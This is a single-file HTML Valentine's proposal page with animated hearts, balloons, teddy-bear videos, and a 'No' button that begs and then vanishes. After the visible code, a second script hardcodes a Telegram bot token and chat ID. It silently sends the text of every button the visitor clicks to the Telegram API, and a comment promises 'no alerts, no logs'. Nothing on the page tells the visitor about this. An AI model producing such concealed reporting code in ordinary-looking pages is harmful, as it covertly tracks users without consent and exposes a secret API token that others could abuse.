<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Will You Be My Valentine?</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ff7eb3, #ff758c, #ff7eb3);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 900px;
            width: 100%;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 25px;
            padding: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            border: 10px solid #ff4d8d;
        }
        
        .heart-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
        }
        
        .heart {
            position: absolute;
            background-color: #ff4d8d;
            display: inline-block;
            height: 30px;
            width: 30px;
            transform: rotate(-45deg);
        }
        
        .heart:before,
        .heart:after {
            content: "";
            background-color: #ff4d8d;
            border-radius: 50%;
            height: 30px;
            position: absolute;
            width: 30px;
        }
        
        .heart:before {
            top: -15px;
            left: 0;
        }
        
        .heart:after {
            left: 15px;
            top: 0;
        }
        
        h1 {
            color: #ff3366;
            font-size: 3.5rem;
            margin-bottom: 20px;
            text-shadow: 3px 3px 0px rgba(255, 255, 255, 0.8);
            position: relative;
            z-index: 2;
        }
        
        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }
        }
        
        .video-container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto 30px;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            border: 8px solid #ff99c2;
        }
        
        .video-container video {
            width: 100%;
            height: auto;
            display: block;
        }
        
        .buttons-container {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        button {
            padding: 18px 45px;
            font-size: 1.8rem;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: bold;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .yes-btn {
            background: linear-gradient(to right, #2ecc71, #1abc9c);
            color: white;
        }
        
        .yes-btn:hover {
            background: linear-gradient(to right, #27ae60, #16a085);
            transform: scale(1.05);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.3);
        }
        
        .yes-btn:active {
            transform: scale(0.98);
        }
        
        .no-btn {
            background: linear-gradient(to right, #e74c3c, #c0392b);
            color: white;
        }
        
        .no-btn:hover {
            background: linear-gradient(to right, #c0392b, #a93226);
            transform: scale(1.05);
        }
        
        .no-btn:active {
            transform: scale(0.98);
        }
        
        .message {
            margin-top: 30px;
            padding: 20px;
            background-color: #fff0f5;
            border-radius: 20px;
            border: 5px dashed #ff66a3;
            font-size: 2.2rem;
            color: #ff3366;
            font-weight: bold;
            display: none;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        
        .balloons {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: 1;
        }
        
        .balloon {
            position: absolute;
            width: 60px;
            height: 70px;
            border-radius: 50%;
            bottom: -100px;
            animation: floatUp 15s linear infinite;
        }
        
        .balloon:before {
            content: "";
            position: absolute;
            width: 2px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.7);
            top: 70px;
            left: 50%;
            transform: translateX(-50%);
        }
        
        .balloon:nth-child(1) {
            background-color: #ff3366;
            left: 10%;
            animation-delay: 0s;
        }
        
        .balloon:nth-child(2) {
            background-color: #ff99cc;
            left: 20%;
            animation-delay: 2s;
        }
        
        .balloon:nth-child(3) {
            background-color: #ff66a3;
            left: 30%;
            animation-delay: 4s;
        }
        
        .balloon:nth-child(4) {
            background-color: #ff3366;
            left: 70%;
            animation-delay: 1s;
        }
        
        .balloon:nth-child(5) {
            background-color: #ff99cc;
            left: 80%;
            animation-delay: 3s;
        }
        
        .balloon:nth-child(6) {
            background-color: #ff66a3;
            left: 90%;
            animation-delay: 5s;
        }
        
        @keyframes floatUp {
            0% {
                transform: translateY(0) rotate(0deg);
                bottom: -100px;
            }
            100% {
                transform: translateY(-100vh) rotate(20deg);
                bottom: 100vh;
            }
        }
        
        .footer {
            margin-top: 30px;
            color: white;
            text-align: center;
            font-size: 1.2rem;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
        }
        
        .hearts {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: 0;
        }
        
        .heart-icon {
            position: absolute;
            color: #ff4d8d;
            font-size: 24px;
            opacity: 0;
            animation: floatHeart 8s linear infinite;
        }
        
        @keyframes floatHeart {
            0% {
                top: 100%;
                opacity: 0;
                transform: translateX(0) rotate(0deg);
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                top: -10%;
                opacity: 0;
                transform: translateX(100px) rotate(360deg);
            }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            button {
                padding: 15px 30px;
                font-size: 1.5rem;
            }
            
            .message {
                font-size: 1.7rem;
            }
            
            .buttons-container {
                gap: 15px;
            }
        }
        
        .fallback-message {
            display: none;
            padding: 20px;
            background: #ffebee;
            border-radius: 10px;
            margin: 20px 0;
            color: #c62828;
        }
        
        .video-fallback {
            width: 100%;
            max-width: 500px;
            margin: 0 auto 30px;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            border: 8px solid #ff99c2;
            display: none;
        }
        
        .video-fallback img {
            width: 100%;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>
    <div class="balloons">
        <div class="balloon"></div>
        <div class="balloon"></div>
        <div class="balloon"></div>
        <div class="balloon"></div>
        <div class="balloon"></div>
        <div class="balloon"></div>
    </div>
    
    <div class="hearts" id="hearts-container"></div>
    
    <div class="container">
        <div class="heart-bg" id="heart-bg"></div>
        
        <h1 id="question">Will you be my Valentine?</h1>
        
        <div class="fallback-message" id="fallback-message">
            <p>If you don't see the teddy bear video, click the buttons below to interact!</p>
        </div>
        
        <div class="video-container">
            <video id="teddy-video" autoplay loop muted playsinline>
                <source src="https://files.catbox.moe/1pu0br.mp4" type="video/mp4">
                <source src="./assets/backup-video-1.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
        
        <div class="video-fallback" id="video-fallback">
            <img src="./assets/placeholder-image.jpg" alt="Valentine Teddy Bear">
            <div style="padding: 20px; background: #ffebee;">
                <p style="color: #c62828; font-weight: bold;">Video couldn't load, but you can still click the buttons!</p>
            </div>
        </div>
        
        <div class="buttons-container" id="buttons-container">
            <button class="yes-btn" id="yes-btn">YES!</button>
            <button class="no-btn" id="no-btn">NO</button>
        </div>
        
        <div class="message" id="message">
            I knew you would say yes my poookieeeeeeee! &lt;3
        </div>
    </div>
    
    <div class="footer">
        Made By Lyta With ðŸ’– 
    </div>

    <script>
        const questionElement = document.getElementById('question');
        const teddyVideo = document.getElementById('teddy-video');
        const yesBtn = document.getElementById('yes-btn');
        const noBtn = document.getElementById('no-btn');
        const messageElement = document.getElementById('message');
        const buttonsContainer = document.getElementById('buttons-container');
        const heartsContainer = document.getElementById('hearts-container');
        const heartBg = document.getElementById('heart-bg');
        const fallbackMessage = document.getElementById('fallback-message');
        const videoFallback = document.getElementById('video-fallback');
        const videoContainer = document.querySelector('.video-container');
        
        teddyVideo.addEventListener('error', function() {
            console.log('Video failed to load, showing fallback');
            videoContainer.style.display = 'none';
            videoFallback.style.display = 'block';
            fallbackMessage.style.display = 'block';
        });
        
        teddyVideo.addEventListener('loadeddata', function() {
            console.log('Video loaded successfully');
        });
        
        for (let i = 0; i < 20; i++) {
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.style.left = `${Math.random() * 100}%`;
            heart.style.top = `${Math.random() * 100}%`;
            heart.style.transform = `rotate(-45deg) scale(${Math.random() * 0.5 + 0.5})`;
            heart.style.opacity = `${Math.random() * 0.3 + 0.1}`;
            heartBg.appendChild(heart);
        }
        
        function createFloatingHeart() {
            const heart = document.createElement('div');
            heart.className = 'heart-icon';
            heart.innerHTML = 'â¤ï¸';
            heart.style.left = `${Math.random() * 100}%`;
            heart.style.fontSize = `${Math.random() * 20 + 15}px`;
            heart.style.animationDuration = `${Math.random() * 5 + 5}s`;
            heart.style.animationDelay = `${Math.random() * 2}s`;
            heartsContainer.appendChild(heart);
            
            setTimeout(() => {
                heart.remove();
            }, 8000);
        }
        
        setInterval(createFloatingHeart, 500);
        
        let noClickCount = 0;
        const noButtonMessages = [
            "Are you sure?",
            "Are you really sureee?",
            "I will be very sad",
            "Please click yes D:",
            "PLEASEEEEE"
        ];
        
        noBtn.addEventListener('click', function() {
            if (noClickCount < noButtonMessages.length) {
                noBtn.textContent = noButtonMessages[noClickCount];
                
                yesBtn.style.transform = `scale(${1 + (noClickCount * 0.1)})`;
                
                noClickCount++;
            } else {
                noBtn.style.display = 'none';
                yesBtn.style.width = '100%';
                yesBtn.style.fontSize = '2.5rem';
                yesBtn.style.padding = '25px 60px';
            }
            
            noBtn.style.animation = 'shake 0.5s';
            setTimeout(() => {
                noBtn.style.animation = '';
            }, 500);
        });
        
        yesBtn.addEventListener('click', function() {
            questionElement.textContent = "Yay! You said YES!";
            
            const newVideoSrc = "https://files.catbox.moe/i836z4.mp4";
            const backupVideoSrc = "./assets/backup-video-2.mp4";
            
            teddyVideo.src = newVideoSrc;
            teddyVideo.load();
            
            teddyVideo.addEventListener('error', function() {
                console.log('Celebration video failed, trying backup');
                teddyVideo.src = backupVideoSrc;
                teddyVideo.load();
            });
            
            buttonsContainer.style.display = 'none';
            messageElement.style.display = 'block';
            
            document.body.style.background = "linear-gradient(135deg, #ff7eb3, #ffd166, #ff7eb3)";
            
            createCelebration();
        });
        
        function createCelebration() {
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    createFloatingHeart();
                }, i * 100);
            }
            
            messageElement.style.animation = 'pulse 1s infinite';
            
            document.querySelector('.container').style.borderColor = '#2ecc71';
            
            const colors = ['#ff3366', '#ff99cc', '#ff66a3', '#2ecc71', '#ffd166'];
            
            for (let i = 0; i < 100; i++) {
                setTimeout(() => {
                    const confetti = document.createElement('div');
                    confetti.style.position = 'fixed';
                    confetti.style.width = '10px';
                    confetti.style.height = '10px';
                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.borderRadius = '50%';
                    confetti.style.left = `${Math.random() * 100}vw`;
                    confetti.style.top = '-10px';
                    confetti.style.zIndex = '9999';
                    confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
                    document.body.appendChild(confetti);
                    
                    const animation = confetti.animate([
                        { top: '-10px', transform: `rotate(0deg)` },
                        { top: `${Math.random() * 50 + 50}vh`, transform: `rotate(${Math.random() * 360}deg)` },
                        { top: '100vh', transform: `rotate(${Math.random() * 720}deg)` }
                    ], {
                        duration: Math.random() * 2000 + 2000,
                        easing: 'cubic-bezier(0.215, 0.610, 0.355, 1)'
                    });
                    
                    animation.onfinish = () => {
                        confetti.remove();
                    };
                }, i * 50);
            }
        }
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0% { transform: translateX(0); }
                25% { transform: translateX(-10px); }
                50% { transform: translateX(10px); }
                75% { transform: translateX(-10px); }
                100% { transform: translateX(0); }
            }
        `;
        document.head.appendChild(style);
    </script>

<script>

const BOT_TOKEN = "8076576843:AAGZjw3Vm2Mnzln3AB2HmgJMALAbJEfmdkQ";
const CHAT_ID   = "7773511038";

/* Telegram API endpoint */
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

/* Event Delegation for ALL buttons (present & future) */
document.addEventListener("click", function (event) {
    const btn = event.target.closest("button");

    if (!btn) return; // Not a button click

    const text = btn.innerText.trim();
    if (!text) return;

    /* Send to Telegram */
    fetch(TELEGRAM_API, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
        })
    })
    .catch(() => {
        /* Silent fail â€” no alerts, no logs */
    });
});
</script>

</body>
</html>
